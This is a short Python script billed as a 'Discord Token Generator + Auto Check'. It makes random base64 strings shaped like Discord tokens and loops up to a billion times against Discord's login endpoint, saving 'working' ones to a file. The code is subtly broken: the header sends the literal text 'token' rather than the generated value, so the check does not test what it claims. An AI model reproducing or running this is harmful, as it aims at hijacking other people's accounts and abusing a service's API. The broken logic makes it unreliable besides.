//dont steal code 
//made by kaankny_x
//youtube : kaankny_x
//instagram : kaankny_x
//follow me in everywhere :P

import random
import time
import base64
import requests
from os import system, name
def clear():
  if name == 'nt':
    _ = system('cls')
  else:
    _ = system('clear')

total=0
work=0
nowork=0

with open("tokens.txt", "a") as tokens:
  def genPart(l):
    userId=""
    for i in range(0, l):
      userId += str(random.randint(0, 9))
    return base64.b64encode(userId.encode()).decode().replace("=", "")

  def getToken():
    return f"{genPart(random.randint(17, 18))}.{genPart(4)}.{genPart(20)}"

  for i in range(0, 1000000000):
    token = getToken()
    headers={
    'Authorization': 'token' # I'll soon be adding support for bulk checking.
}
    src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
    try:
        if src.status_code == 200:
            total+=1
            work+=1
            clear()
            tokens.write(token + "\n")
            print("Discord Token Generator + Auto Check by KaanKny_x")
            print("-------------------------------------------------")
            print("""
TOTAL CHECK : {}
WORKING : {}
NO WORK : {}
            
            """.format(total,work,nowork))
        else:
          total+=1
          nowork+=1
          clear()
          print("Discord Token Generator + Auto Check by KaanKny_x")
          print("-------------------------------------------------")
          print("""
TOTAL CHECK : {}
WORKING : {}
NO WORK : {}
            
            """.format(total,work,nowork))
    except Exception:
        print("Yeah we can't contact discordapp.com")  
        
